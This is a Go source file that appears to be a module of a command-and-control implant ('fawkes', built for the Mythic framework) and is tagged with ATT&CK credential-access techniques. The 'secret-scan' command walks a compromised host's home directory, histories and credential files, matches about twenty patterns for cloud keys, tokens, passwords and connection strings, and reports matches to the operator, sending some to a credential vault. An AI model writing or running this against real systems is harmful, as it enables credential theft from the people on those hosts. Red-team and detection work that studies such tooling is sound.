package commands

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"fawkes/pkg/structs"
)

type SecretScanCommand struct{}

func (c *SecretScanCommand) Name() string        { return "secret-scan" }
func (c *SecretScanCommand) Description() string {
	return "Search files for secrets, API keys, private keys, and sensitive patterns (T1552.001, T1005)"
}

type secretScanArgs struct {
	Path       string   `json:"path"`        // Search root (default: home dir)
	Depth      int      `json:"depth"`       // Max directory depth (default: 5)
	MaxResults int      `json:"max_results"` // Max findings to return (default: 100)
	Extensions []string `json:"extensions"`  // File extensions to scan (default: common config types)
}

type secretFinding struct {
	File    string `json:"file"`
	Line    int    `json:"line"`
	Type    string `json:"type"`
	Preview string `json:"preview"`
}

// secretPattern defines a regex pattern and its classification.
type secretPattern struct {
	Name    string
	Pattern *regexp.Regexp
}

// precompiled secret detection patterns
var secretPatterns = func() []secretPattern {
	patterns := []struct {
		name    string
		pattern string
	}{
		{"AWS Access Key", `AKIA[0-9A-Z]{16}`},
		{"AWS Secret Key", `(?i)aws_secret_access_key\s*[:=]\s*['"]?[A-Za-z0-9/+=]{40}`},
		{"Private Key", `-----BEGIN\s+(RSA\s+|EC\s+|DSA\s+|OPENSSH\s+)?PRIVATE\s+KEY-----`},
		{"GitHub Token", `gh[ps]_[A-Za-z0-9_]{36,}`},
		{"GitHub Fine-Grained Token", `github_pat_[A-Za-z0-9_]{22,}`},
		{"GitLab Token", `glpat-[A-Za-z0-9_-]{20,}`},
		{"Slack Token", `xox[bporas]-[0-9]+-[A-Za-z0-9-]+`},
		{"Slack Webhook", `https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+`},
		{"Generic API Key", `(?i)(api[_-]?key|api[_-]?secret)\s*[:=]\s*['"]?[A-Za-z0-9+/=_-]{20,}['"]?`},
		{"Generic Secret", `(?i)(client[_-]?secret|app[_-]?secret)\s*[:=]\s*['"]?[A-Za-z0-9+/=_-]{20,}['"]?`},
		{"Generic Token", `(?i)(access[_-]?token|auth[_-]?token|bearer[_-]?token)\s*[:=]\s*['"]?[A-Za-z0-9+/=_.-]{20,}['"]?`},
		{"Generic Password", `(?i)(password|passwd|pwd)\s*[:=]\s*['"]?[^\s'"]{8,}['"]?`},
		{"Connection String", `(?i)(jdbc|mongodb(\+srv)?|postgresql|mysql|redis|amqp|mssql)://[^\s'"]+`},
		{"Azure Client Secret", `(?i)azure[_-]?(client[_-]?secret|tenant[_-]?id)\s*[:=]\s*['"]?[A-Za-z0-9+/=_.-]{20,}['"]?`},
		{"GCP Service Account Key", `"type"\s*:\s*"service_account"`},
		{"NPM Token", `//registry\.npmjs\.org/:_authToken=[A-Za-z0-9_-]+`},
		{"Twilio API Key", `SK[0-9a-fA-F]{32}`},
		{"SendGrid API Key", `SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}`},
		{"Stripe Key", `[sr]k_(live|test)_[A-Za-z0-9]{20,}`},
		{"Heroku API Key", `(?i)heroku[_-]?api[_-]?key\s*[:=]\s*['"]?[0-9a-f-]{36}['"]?`},
	}

	compiled := make([]secretPattern, 0, len(patterns))
	for _, p := range patterns {
		re, err := regexp.Compile(p.pattern)
		if err == nil {
			compiled = append(compiled, secretPattern{Name: p.name, Pattern: re})
		}
	}
	return compiled
}()

// defaultScanExtensions lists file extensions to scan by default.
var defaultScanExtensions = map[string]bool{
	".env": true, ".conf": true, ".cfg": true, ".ini": true,
	".yml": true, ".yaml": true, ".json": true, ".xml": true,
	".toml": true, ".properties": true, ".config": true,
	".sh": true, ".bash": true, ".zsh": true, ".fish": true,
	".ps1": true, ".psm1": true, ".bat": true, ".cmd": true,
	".py": true, ".rb": true, ".js": true, ".ts": true,
	".go": true, ".rs": true, ".java": true, ".cs": true,
	".tf": true, ".tfvars": true, ".hcl": true,
	".pem": true, ".key": true, ".p12": true,
	".docker": true, ".npmrc": true, ".pypirc": true,
	".gitconfig": true, ".netrc": true, ".pgpass": true,
}

const maxFileSize = 10 * 1024 * 1024 // 10MB

func (c *SecretScanCommand) Execute(task structs.Task) structs.CommandResult {
	var args secretScanArgs
	if task.Params != "" {
		_ = json.Unmarshal([]byte(task.Params), &args)
	}

	if args.Path == "" {
		home, err := os.UserHomeDir()
		if err != nil {
			return errorf("Error getting home directory: %v", err)
		}
		args.Path = home
	}
	if args.Depth <= 0 {
		args.Depth = 5
	}
	if args.MaxResults <= 0 {
		args.MaxResults = 100
	}

	// Build extension set
	extSet := defaultScanExtensions
	if len(args.Extensions) > 0 {
		extSet = make(map[string]bool, len(args.Extensions))
		for _, ext := range args.Extensions {
			if !strings.HasPrefix(ext, ".") {
				ext = "." + ext
			}
			extSet[strings.ToLower(ext)] = true
		}
	}

	var findings []secretFinding
	var creds []structs.MythicCredential

	_ = filepath.WalkDir(args.Path, func(path string, d fs.DirEntry, err error) error {
		if task.DidStop() {
			return fmt.Errorf("cancelled")
		}
		if err != nil {
			return filepath.SkipDir
		}

		// Depth check
		rel, _ := filepath.Rel(args.Path, path)
		depth := strings.Count(rel, string(filepath.Separator))
		if depth > args.Depth {
			if d.IsDir() {
				return filepath.SkipDir
			}
			return nil
		}

		// Skip directories and symlinks
		if d.IsDir() {
			name := d.Name()
			// Skip common noise directories
			if name == "node_modules" || name == ".git" || name == "__pycache__" ||
				name == "vendor" || name == ".cache" || name == ".local" {
				return filepath.SkipDir
			}
			return nil
		}

		// Check max results
		if len(findings) >= args.MaxResults {
			return filepath.SkipAll
		}

		// Check file extension
		ext := strings.ToLower(filepath.Ext(path))
		baseName := strings.ToLower(d.Name())

		// Always scan dotfiles that match known sensitive names
		scanByName := baseName == ".env" || baseName == ".netrc" ||
			baseName == ".pgpass" || baseName == ".npmrc" ||
			baseName == ".pypirc" || baseName == ".gitconfig" ||
			baseName == ".docker" || baseName == ".aws" ||
			strings.HasSuffix(baseName, "credentials") ||
			strings.HasSuffix(baseName, "_history")

		if !extSet[ext] && !scanByName {
			return nil
		}

		// Check file size
		info, err := d.Info()
		if err != nil || info.Size() > maxFileSize || info.Size() == 0 {
			return nil
		}

		// Scan file
		results := scanFileForSecrets(path)
		for _, r := range results {
			if len(findings) >= args.MaxResults {
				break
			}
			findings = append(findings, r)

			// Report certain types to credential vault
			if r.Type == "AWS Access Key" || r.Type == "GitHub Token" ||
				r.Type == "GitLab Token" || r.Type == "Slack Token" ||
				r.Type == "Stripe Key" {
				creds = append(creds, structs.MythicCredential{
					CredentialType: "plaintext",
					Realm:          r.Type,
					Account:        r.File,
					Credential:     r.Preview,
					Comment:        fmt.Sprintf("secret-scan line %d", r.Line),
				})
			}
		}

		return nil
	})

	if len(findings) == 0 {
		return successResult("No secrets found in scanned files")
	}

	// Build output
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Found %d potential secrets:\n\n", len(findings)))

	for _, f := range findings {
		sb.WriteString(fmt.Sprintf("[%s] %s:%d\n  %s\n\n", f.Type, f.File, f.Line, f.Preview))
	}

	if len(findings) >= args.MaxResults {
		sb.WriteString(fmt.Sprintf("(results truncated at %d — increase max_results to see more)\n", args.MaxResults))
	}

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
	if len(creds) > 0 {
		result.Credentials = &creds
	}
	return result
}

// scanFileForSecrets reads a file line by line and matches against secret patterns.
func scanFileForSecrets(path string) []secretFinding {
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()

	var findings []secretFinding
	scanner := bufio.NewScanner(f)
	scanner.Buffer(make([]byte, 0, 64*1024), 1024*1024) // 1MB line buffer
	lineNum := 0

	for scanner.Scan() {
		lineNum++
		line := scanner.Text()

		// Skip empty or very short lines
		if len(line) < 10 {
			continue
		}

		for _, sp := range secretPatterns {
			if match := sp.Pattern.FindString(line); match != "" {
				// Redact the actual secret value for safety
				preview := redactSecret(match, sp.Name)
				findings = append(findings, secretFinding{
					File:    path,
					Line:    lineNum,
					Type:    sp.Name,
					Preview: preview,
				})
				break // One finding per line to avoid duplicates
			}
		}
	}

	return findings
}

// redactSecret masks the sensitive portion of a matched secret.
func redactSecret(match, secretType string) string {
	switch {
	case secretType == "Private Key":
		return match // Just the header line, no secret value
	case secretType == "AWS Access Key":
		if len(match) >= 8 {
			return match[:8] + "***" + match[len(match)-4:]
		}
	case secretType == "Connection String":
		// Mask password in connection strings
		if atIdx := strings.Index(match, "@"); atIdx > 0 {
			if colonIdx := strings.LastIndex(match[:atIdx], ":"); colonIdx > 0 {
				return match[:colonIdx+1] + "***@" + match[atIdx+1:]
			}
		}
	case strings.Contains(secretType, "Token") || strings.Contains(secretType, "Key"):
		if eqIdx := strings.IndexAny(match, ":="); eqIdx > 0 {
			prefix := match[:eqIdx+1]
			val := strings.TrimSpace(match[eqIdx+1:])
			val = strings.Trim(val, `'"`)
			if len(val) > 8 {
				return prefix + " " + val[:4] + "***" + val[len(val)-4:]
			}
		}
		// Standalone tokens
		if len(match) > 12 {
			return match[:8] + "***" + match[len(match)-4:]
		}
	case secretType == "Generic Password":
		if eqIdx := strings.IndexAny(match, ":="); eqIdx > 0 {
			return match[:eqIdx+1] + " [REDACTED]"
		}
	}
	// Default: show first 8 and last 4 chars
	if len(match) > 16 {
		return match[:8] + "***" + match[len(match)-4:]
	}
	return match
}
